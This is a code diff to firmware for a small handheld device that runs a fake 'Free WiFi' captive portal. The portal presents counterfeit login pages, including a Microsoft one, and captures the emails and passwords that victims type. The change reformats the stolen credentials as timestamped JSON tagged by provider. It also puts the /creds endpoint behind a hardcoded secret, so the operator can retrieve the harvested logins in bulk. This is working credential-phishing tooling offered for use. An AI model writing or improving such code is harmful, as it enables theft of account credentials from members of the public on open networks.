@@ -22,6 +22,9 @@
 // Can be changed at http://127.0.0.1/ssid
 #define DEFAULT_AP_SSID_NAME "Free WiFi"
 
+// Secret to get the creds
+#define SECRET "P@ssw0rd!"
+
 #if defined(M5STICK_C_PLUS) && defined(M5STICK_C_PLUS_2) && defined(M5CARDPUTER)
 #error "Please define only one platform: M5STICK_C_PLUS, M5STICK_C_PLUS_2 or M5CARDPUTER"
 #endif
@@ -128,7 +131,7 @@ LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
 
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
-String capturedCredentialsHtml = "";
+String capturedCredentialsJson = "";
 bool sdcardMounted = false;
 String hr,mi,se;
 
@@ -269,7 +272,7 @@ void setupWebServer() {
   });
 
   webServer.on("/creds", []() {
-    webServer.send(HTTP_CODE, "text/html", creds_GET());
+    webServer.send(HTTP_CODE, "application/json", creds_GET());
   });
 
   webServer.on("/clear", []() {
@@ -635,8 +638,12 @@ String index_POST() {
   String provider = getInputValue("provider");
   provider.toLowerCase();
 
-  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
-  Serial.printf("Credential: %s\n", String(email + ":" + password).c_str());
+  String ts = String(round(millis() / 1000));
+  String cred = "{\"timestamp\": "+ ts + ", \"provider\": \""+ provider +"\", \"username\": \""+ email +"\", \"password\": \""+ password +"\"}";
+  if (capturedCredentialsJson != "") capturedCredentialsJson = capturedCredentialsJson + ",";
+  capturedCredentialsJson = capturedCredentialsJson + cred;
+
+  Serial.printf("%s\n", cred.c_str());
 
   if ((provider == "microsoft") || (provider == "msft")){
     provider = "msft";
@@ -773,9 +780,7 @@ String getHtmlContents(String body, String provider) {
 
 
 String clear_GET() {
-  String email = "<p></p>";
-  String password = "<p></p>";
-  capturedCredentialsHtml = "<p></p>";
+  capturedCredentialsJson = "";
   totalCapturedCredentials = cp1 = cp2 = cp3 = 0;
 
   for(int i=0;i<4;i++){
@@ -789,7 +794,11 @@ String clear_GET() {
 }
 
 String creds_GET() {
-  return getAdminHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
+  String secret = getInputValue("secret");
+  if (secret.isEmpty() || secret != SECRET)
+    return "{\"message\": \"access denied\"}";
+  
+  return "{\"creds\": ["+ capturedCredentialsJson +"]}";
 }
 
 
